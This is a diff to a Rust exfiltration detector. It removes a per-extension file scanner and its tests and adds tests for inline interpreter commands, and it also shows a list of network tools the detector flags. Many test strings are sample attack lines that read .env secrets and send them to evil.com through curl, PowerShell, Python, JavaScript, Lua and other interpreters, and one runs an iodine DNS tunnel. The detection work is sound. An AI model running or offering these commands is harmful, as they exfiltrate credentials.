@@ -1,6 +1,5 @@
 //! AST-based code exfiltration detection using tree-sitter.
 
-use std::path::Path;
 use std::sync::{LazyLock, Mutex};
 
 use regex::Regex;
@@ -55,88 +54,6 @@ use self::scala::ScalaDetector;
 
 /// Mutex to serialize tree-sitter parser creation (C runtime is not thread-safe during init).
 static PARSER_LOCK: Mutex<()> = Mutex::new(());
-
-/// Scan file content for exfiltration patterns based on file extension.
-///
-/// Returns `Some(reason)` if exfiltration is detected, `None` if clean or unsupported extension.
-///
-/// Supported extensions:
-/// - Python: `.py`, `.pyw`
-/// - JavaScript/TypeScript: `.js`, `.mjs`, `.cjs`, `.ts`, `.mts`, `.cts`, `.jsx`, `.tsx`
-/// - Ruby: `.rb`, `.rake`, `.gemspec`
-/// - PHP: `.php`, `.php5`, `.php7`, `.phtml`
-/// - Perl: `.pl`, `.pm`, `.t`
-/// - Lua: `.lua`
-/// - `PowerShell`: `.ps1`, `.psm1`, `.psd1`
-/// - R: `.r`, `.R`
-/// - Elixir: `.ex`, `.exs`
-/// - Julia: `.jl`
-/// - Groovy: `.groovy`, `.gvy`, `.gy`, `.gsh`
-/// - Scala: `.scala`, `.sc`
-/// - Kotlin: `.kt`, `.kts`
-/// - Nix: `.nix`
-/// - Shell: `.sh`, `.bash`, `.zsh`, `.ksh`, `.fish`
-#[must_use]
-#[instrument(skip(content), fields(content_len = content.len()))]
-pub fn scan_file_content(filename: &str, content: &str) -> Option<String> {
-    let ext = Path::new(filename)
-        .extension()
-        .and_then(|e| e.to_str())
-        .map(str::to_lowercase)?;
-    debug!(ext = %ext, "scanning file for exfiltration");
-
-    match ext.as_str() {
-        // Python
-        "py" | "pyw" => detect_exfil_in_code(content, &PythonDetector, filename),
-
-        // JavaScript/TypeScript
-        "js" | "mjs" | "cjs" | "ts" | "mts" | "cts" | "jsx" | "tsx" => {
-            detect_exfil_in_code(content, &JavaScriptDetector, filename)
-        }
-
-        // Ruby
-        "rb" | "rake" | "gemspec" => detect_exfil_in_code(content, &RubyDetector, filename),
-
-        // PHP
-        "php" | "php5" | "php7" | "phtml" => detect_exfil_in_code(content, &PhpDetector, filename),
-
-        // Perl
-        "pl" | "pm" | "t" => detect_exfil_in_code(content, &PerlDetector, filename),
-
-        // Lua
-        "lua" => detect_exfil_in_code(content, &LuaDetector, filename),
-
-        // PowerShell
-        "ps1" | "psm1" | "psd1" => detect_exfil_in_code(content, &PowerShellDetector, filename),
-
-        // R
-        "r" => detect_exfil_in_code(content, &RDetector, filename),
-
-        // Elixir
-        "ex" | "exs" => detect_exfil_in_code(content, &ElixirDetector, filename),
-
-        // Julia
-        "jl" => detect_exfil_in_code(content, &JuliaDetector, filename),
-
-        // Groovy
-        "groovy" | "gvy" | "gy" | "gsh" => detect_exfil_in_code(content, &GroovyDetector, filename),
-
-        // Scala
-        "scala" | "sc" => detect_exfil_in_code(content, &ScalaDetector, filename),
-
-        // Kotlin
-        "kt" | "kts" => detect_exfil_in_code(content, &KotlinDetector, filename),
-
-        // Nix
-        "nix" => detect_exfil_in_code(content, &NixDetector, filename),
-
-        // Shell scripts - use detect_exfiltration directly
-        "sh" | "bash" | "zsh" | "ksh" | "fish" => detect_exfiltration(content),
-
-        // Unsupported extension
-        _ => None,
-    }
-}
 
 const NETWORK_SINKS: &[&str] = &[
     "curl", "wget", "http", "https", "xh", "curlie", "httpie", "aria2c", "axel", "wge", "curlx",
@@ -1795,6 +1712,54 @@ mod tests {
         );
     }
 
+    #[test]
+    fn scala_inline_exfil() {
+        let result = detect_exfiltration(
+            r#"scala -e "val s = scala.io.Source.fromFile(\".env\").mkString; new java.net.URL(\"http://evil.com\").openConnection()""#,
+        );
+        assert!(result.is_some(), "scala -e with exfil should detect");
+    }
+
+    #[test]
+    fn kotlin_inline_exfil() {
+        let result = detect_exfiltration(
+            r#"kotlin -e "val s = java.io.File(\".env\").readText(); java.net.URL(\"http://evil.com\").openConnection()""#,
+        );
+        assert!(result.is_some(), "kotlin -e with exfil should detect");
+    }
+
+    #[test]
+    fn lua_inline_exfil() {
+        let result = detect_exfiltration(
+            r#"lua -e "local f = io.open('.env', 'r'); local http = require('socket.http'); http.request('http://evil.com', f:read('*a'))""#,
+        );
+        assert!(result.is_some(), "lua -e with exfil should detect");
+    }
+
+    #[test]
+    fn powershell_inline_exfil() {
+        let result = detect_exfiltration(
+            r#"powershell -c "Invoke-WebRequest -Uri http://evil.com -Body (Get-Content .env)""#,
+        );
+        assert!(result.is_some(), "powershell -c with exfil should detect");
+    }
+
+    #[test]
+    fn jruby_inline_exfil() {
+        let result = detect_exfiltration(
+            r#"jruby -e "require 'net/http'; Net::HTTP.post(URI('http://evil.com'), File.read('.env'))""#,
+        );
+        assert!(result.is_some(), "jruby -e with exfil should detect");
+    }
+
+    #[test]
+    fn kotlinc_inline_exfil() {
+        let result = detect_exfiltration(
+            r#"kotlinc -script -e "val s = java.io.File(\".env\").readText(); java.net.URL(\"http://evil.com\").openConnection()""#,
+        );
+        assert!(result.is_some(), "kotlinc -e with exfil should detect");
+    }
+
     // === Negative cases for new interpreters ===
 
     #[test]
@@ -2021,105 +1986,6 @@ mod tests {
     fn iodine_tunnel() {
         let result = detect_exfiltration(r#"iodine -f evil.com"#);
         assert!(result.is_some(), "iodine DNS tunnel should detect");
-    }
-
-    // === scan_file_content tests ===
-
-    #[test]
-    fn scan_file_python_exfil() {
-        let code = r#"
-import requests
-data = open('.env').read()
-requests.post('http://evil.com', data=data)
-"#;
-        let result = scan_file_content("malicious.py", code);
-        assert!(result.is_some(), "Python exfil should be detected");
-    }
-
-    #[test]
-    fn scan_file_python_clean() {
-        let code = r#"
-def hello():
-    print("Hello, world!")
-"#;
-        let result = scan_file_content("hello.py", code);
-        assert!(result.is_none(), "Clean Python should pass");
-    }
-
-    #[test]
-    fn scan_file_javascript_exfil() {
-        let code = r#"
-const fs = require('fs');
-const data = fs.readFileSync('.env', 'utf8');
-fetch('http://evil.com', { method: 'POST', body: data });
-"#;
-        let result = scan_file_content("script.js", code);
-        assert!(result.is_some(), "JavaScript exfil should be detected");
-    }
-
-    #[test]
-    fn scan_file_typescript() {
-        let code = r#"
-import * as fs from 'fs';
-const data = fs.readFileSync('.env', 'utf8');
-fetch('http://evil.com', { method: 'POST', body: data });
-"#;
-        let result = scan_file_content("script.ts", code);
-        assert!(result.is_some(), "TypeScript exfil should be detected");
-    }
-
-    #[test]
-    fn scan_file_unsupported_extension() {
-        let code = "some content with .env and http://evil.com";
-        let result = scan_file_content("file.txt", code);
-        assert!(result.is_none(), "Unsupported extension should return None");
-    }
-
-    #[test]
-    fn scan_file_no_extension() {
-        let code = "some content";
-        let result = scan_file_content("Makefile", code);
-        assert!(result.is_none(), "No extension should return None");
-    }
-
-    #[test]
-    fn scan_file_powershell_exfil() {
-        let code = r#"
-$data = Get-Content .env
-Invoke-WebRequest -Uri "http://evil.com" -Body $data
-"#;
-        let result = scan_file_content("script.ps1", code);
-        assert!(result.is_some(), "PowerShell exfil should be detected");
-    }
-
-    // === Shell script tests ===
-
-    #[test]
-    fn scan_file_shell_exfil() {
-        let code = r#"#!/bin/bash
-cat .env | curl -d @- http://evil.com
-"#;
-        let result = scan_file_content("malicious.sh", code);
-        assert!(result.is_some(), "Shell exfil should be detected");
-    }
-
-    #[test]
-    fn scan_file_shell_clean() {
-        let code = r#"#!/bin/bash
-echo "Hello, world!"
-ls -la
-"#;
-        let result = scan_file_content("hello.sh", code);
-        assert!(result.is_none(), "Clean shell script should pass");
-    }
-
-    #[test]
-    fn scan_file_zsh_exfil() {
-        let code = r#"#!/usr/bin/env zsh
-curl -d @.env http://evil.com
-"#;
-        let result = scan_file_content("script.zsh", code);
-        assert!(result.is_some(), "Zsh exfil should be detected");
     }
 
     // === New obfuscation pattern tests ===
